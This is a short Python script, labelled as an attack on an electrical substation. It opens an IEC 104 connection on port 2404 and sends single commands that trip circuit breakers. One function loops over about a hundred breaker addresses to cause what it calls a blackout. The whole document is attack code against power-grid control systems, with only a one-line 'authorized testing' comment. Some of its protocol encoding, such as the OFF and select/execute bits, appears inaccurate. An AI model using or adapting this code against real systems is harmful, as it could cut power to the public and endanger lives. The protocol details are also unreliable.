#!/usr/bin/env python3
"""
IEC 104 attack on electrical substation
Send commands to trip circuit breakers
"""

import socket
import struct

def iec104_send_command(target_ip, ioa, command):
    """
    Send IEC 104 single command
    ioa: Information Object Address (breaker ID)
    command: 0x01 (ON), 0x02 (OFF)
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, 2404))

    # STARTDT (Start Data Transfer)
    startdt = bytes.fromhex('68 04 07 00 00 00')
    sock.send(startdt)
    sock.recv(1024)  # STARTDT CON

    # Build ASDU (Type ID 45: Single Command)
    apdu_start = b'\x68'
    apdu_length = struct.pack('B', 14)

    # APCI (I-frame)
    apci = struct.pack('<HH', 0x0000, 0x0000)  # Send/Receive sequence numbers

    # ASDU
    type_id = struct.pack('B', 45)  # Single command
    vsq = struct.pack('B', 0x01)    # 1 object
    cot = struct.pack('B', 0x06)    # Cause: Activation
    oa = struct.pack('B', 0x01)     # Originator address
    ca = struct.pack('<H', 0x0001)  # Common address

    # Information Object
    ioa_bytes = struct.pack('<I', ioa)[:3]  # 3-byte IOA
    sco = struct.pack('B', command | 0x80)  # Single Command Object (with select + execute)

    asdu = type_id + vsq + cot + oa + ca + ioa_bytes + sco

    packet = apdu_start + apdu_length + apci + asdu

    sock.send(packet)
    response = sock.recv(1024)

    print(f"[+] Sent IEC 104 command to IOA {ioa}")
    print(f"[*] Command: {'ON' if command == 0x01 else 'OFF'}")

    sock.close()

# Attack scenario: Trip all breakers in substation
def trip_all_breakers(substation_ip):
    """
    Mass breaker trip attack (blackout scenario)
    """
    print("[!] WARNING: This will cause power outage")
    print("[*] Tripping all circuit breakers...")

    for ioa in range(1, 100):  # Typical substation has 10-50 breakers
        try:
            iec104_send_command(substation_ip, ioa, 0x02)  # OFF command
            print(f"[+] Breaker {ioa} tripped")
        except:
            pass

# WARNING: Use only in authorized testing
# trip_all_breakers('192.168.1.100')
